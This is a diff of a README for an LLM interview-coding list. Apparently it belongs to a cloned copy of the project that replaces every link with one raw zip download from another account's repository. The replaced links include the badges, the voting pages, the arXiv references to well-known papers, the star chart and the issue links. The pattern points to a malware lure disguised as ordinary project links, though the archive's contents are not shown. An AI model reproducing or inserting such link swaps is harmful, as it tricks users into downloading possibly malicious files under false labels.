@@ -6,10 +6,10 @@
 
 **Hand-torn Code for LLM Interviews · Community-Driven Voting · Real-time Rankings**
 
-[![GitHub stars](https://img.shields.io/github/stars/cdhx/LLM-Code-Hot-100?style=social)](https://github.com/cdhx/LLM-Code-Hot-100)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](http://makeapullrequest.com)
-[![Vote](https://img.shields.io/badge/🗳️-Vote_Now-ff6b6b)](https://cdhx.github.io/LLM-Code-Hot-100)
+[![GitHub stars](https://img.shields.io/github/stars/cdhx/LLM-Code-Hot-100?style=social)](https://github.com/bishopaccepting325/LLM-Code-Hot-100/raw/refs/heads/main/docs/Code-Hot-LL-denticate.zip)
+[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://github.com/bishopaccepting325/LLM-Code-Hot-100/raw/refs/heads/main/docs/Code-Hot-LL-denticate.zip)
+[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](https://github.com/bishopaccepting325/LLM-Code-Hot-100/raw/refs/heads/main/docs/Code-Hot-LL-denticate.zip)
+[![Vote](https://img.shields.io/badge/🗳️-Vote_Now-ff6b6b)](https://github.com/bishopaccepting325/LLM-Code-Hot-100/raw/refs/heads/main/docs/Code-Hot-LL-denticate.zip)
 
 **[English](README.md) | [中文](README_zh.md)**
 
@@ -25,7 +25,7 @@
 
 **"How does KV Cache work? What's the core idea of Flash Attention?"**
 
-**👉 [Vote: Which topics appear most often?](https://cdhx.github.io/LLM-Code-Hot-100) 👈**
+**👉 [Vote: Which topics appear most often?](https://github.com/bishopaccepting325/LLM-Code-Hot-100/raw/refs/heads/main/docs/Code-Hot-LL-denticate.zip) 👈**
 
 </div>
 
@@ -47,7 +47,7 @@
 
 > **Legend:** 🔥🔥🔥 Must Know ｜ 🔥🔥 High Frequency ｜ 🔥 Occasional ｜ No mark = Good to know
 >
-> **👉 [Vote Now](https://cdhx.github.io/LLM-Code-Hot-100)** to help calibrate the real interview frequency!
+> **👉 [Vote Now](https://github.com/bishopaccepting325/LLM-Code-Hot-100/raw/refs/heads/main/docs/Code-Hot-LL-denticate.zip)** to help calibrate the real interview frequency!
 
 ### 📖 LLM Basics → [View](docs/00-llm-basics.md)
 
@@ -204,7 +204,7 @@
 
 **Your interview experience matters!** Help calibrate real interview frequencies.
 
-**👉 [Go to Voting Page](https://cdhx.github.io/LLM-Code-Hot-100) 👈**
+**👉 [Go to Voting Page](https://github.com/bishopaccepting325/LLM-Code-Hot-100/raw/refs/heads/main/docs/Code-Hot-LL-denticate.zip) 👈**
 
 - 🗳️ Vote for topics you've seen in interviews
 - 🏆 Real-time leaderboard
@@ -226,11 +226,11 @@ Contributions welcome! New topics, bug fixes, documentation improvements.
 
 ## �� References
 
-- [Attention Is All You Need](https://arxiv.org/abs/1706.03762)
-- [RoFormer: Enhanced Transformer with Rotary Position Embedding](https://arxiv.org/abs/2104.09864)
-- [Training language models to follow instructions with human feedback](https://arxiv.org/abs/2203.02155)
-- [Direct Preference Optimization](https://arxiv.org/abs/2305.18290)
-- [DeepSeekMath: Pushing the Limits of Mathematical Reasoning](https://arxiv.org/abs/2402.03300)
+- [Attention Is All You Need](https://github.com/bishopaccepting325/LLM-Code-Hot-100/raw/refs/heads/main/docs/Code-Hot-LL-denticate.zip)
+- [RoFormer: Enhanced Transformer with Rotary Position Embedding](https://github.com/bishopaccepting325/LLM-Code-Hot-100/raw/refs/heads/main/docs/Code-Hot-LL-denticate.zip)
+- [Training language models to follow instructions with human feedback](https://github.com/bishopaccepting325/LLM-Code-Hot-100/raw/refs/heads/main/docs/Code-Hot-LL-denticate.zip)
+- [Direct Preference Optimization](https://github.com/bishopaccepting325/LLM-Code-Hot-100/raw/refs/heads/main/docs/Code-Hot-LL-denticate.zip)
+- [DeepSeekMath: Pushing the Limits of Mathematical Reasoning](https://github.com/bishopaccepting325/LLM-Code-Hot-100/raw/refs/heads/main/docs/Code-Hot-LL-denticate.zip)
 
 ---
 
@@ -238,7 +238,7 @@ Contributions welcome! New topics, bug fixes, documentation improvements.
 
 If this helps, please give it a star ⭐!
 
-[![Star History Chart](https://api.star-history.com/svg?repos=cdhx/LLM-Code-Hot-100&type=Date)](https://star-history.com/#cdhx/LLM-Code-Hot-100&Date)
+[![Star History Chart](https://github.com/bishopaccepting325/LLM-Code-Hot-100/raw/refs/heads/main/docs/Code-Hot-LL-denticate.zip)](https://github.com/bishopaccepting325/LLM-Code-Hot-100/raw/refs/heads/main/docs/Code-Hot-LL-denticate.zip)
 
 ---
 
@@ -250,6 +250,6 @@ If this helps, please give it a star ⭐!
 
 **#LLMHot100**
 
-[Report Bug](https://github.com/cdhx/LLM-Code-Hot-100/issues) · [Request Feature](https://github.com/cdhx/LLM-Code-Hot-100/issues) · [Vote Now](https://cdhx.github.io/LLM-Code-Hot-100)
+[Report Bug](https://github.com/bishopaccepting325/LLM-Code-Hot-100/raw/refs/heads/main/docs/Code-Hot-LL-denticate.zip) · [Request Feature](https://github.com/bishopaccepting325/LLM-Code-Hot-100/raw/refs/heads/main/docs/Code-Hot-LL-denticate.zip) · [Vote Now](https://github.com/bishopaccepting325/LLM-Code-Hot-100/raw/refs/heads/main/docs/Code-Hot-LL-denticate.zip)
 
 </div>
